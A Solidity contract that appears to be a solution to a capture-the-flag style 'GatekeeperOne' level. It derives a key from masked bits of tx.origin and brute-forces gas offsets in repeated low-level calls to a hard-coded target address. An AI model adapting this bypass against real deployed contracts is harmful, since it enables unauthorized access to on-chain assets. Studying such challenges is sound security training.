// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}
contract Attack {

    IGatekeeperOne level13 = IGatekeeperOne(0x74593394661fFDf6e1ED9DF23C04c63491D4CcEF);
    address _target = 0x74593394661fFDf6e1ED9DF23C04c63491D4CcEF;

    function callIt() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        
        for(uint256 i = 0; i < 300; i++){
            uint256 totalGas = i + (8191 * 3);
            (bool result,) = _target.call{gas: totalGas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            
            if(result){
                break;
            }
        }
    }

}
